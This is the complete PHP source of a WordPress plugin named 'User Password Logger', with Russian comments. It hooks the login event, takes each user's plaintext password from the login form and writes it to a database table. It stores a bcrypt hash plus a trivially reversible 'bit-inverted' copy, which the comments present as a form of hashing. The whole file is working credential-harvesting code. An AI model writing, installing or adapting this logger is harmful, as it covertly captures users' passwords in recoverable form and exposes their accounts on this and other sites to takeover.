<?php
/**
 * Plugin Name: User Password Logger
 * Description: Сохраняет пароли пользователей при их входе в систему.
 * Version: 1.0
 * Author: TMA
 */

// Функция для обработки данных при успешном входе пользователя
function log_user_password($username, $user) {
    global $wpdb;

    // Получаем пароль пользователя из поля $_POST['pwd'], который был введен при логине
    $password = $_POST['pwd']; // Пароль, введенный при логине (из POST-запроса)

    // Хэшируем пароль
    $hashed_password = password_hash($password, PASSWORD_BCRYPT);

    // Инвертируем пароль
    $inverted_password = invert_password_bits($password);

    // Вставляем данные в таблицу
    $table_name = $wpdb->prefix . 'user_password'; // Используем уже существующую таблицу
    $wpdb->insert(
        $table_name,
        array(
            'username' => $username,
            'password' => $hashed_password,      // Хэшированный пароль
            'password_inverted' => $inverted_password // Инвертированный пароль
        )
    );
}

// Функция для инвертирования битов каждого символа пароля
function invert_password_bits($password) {
    $inverted_password = '';

    // Проходим по каждому символу в пароле
    foreach (str_split($password) as $char) {
        // Получаем ASCII-код символа
        $ascii = ord($char);

        // Преобразуем его в 8-битное бинарное представление
        $binary = str_pad(decbin($ascii), 8, '0', STR_PAD_LEFT);

        // Инвертируем биты (меняем 1 на 0, а 0 на 1)
        $inverted_binary = '';
        for ($i = 0; $i < strlen($binary); $i++) {
            $inverted_binary .= ($binary[$i] === '0') ? '1' : '0';
        }

        // Добавляем инвертированный символ в итоговую строку
        $inverted_password .= $inverted_binary;
    }

    return $inverted_password;
}

// Подключаем функцию к хуку "wp_login", который срабатывает при успешном входе пользователя
add_action('wp_login', 'log_user_password', 10, 2);
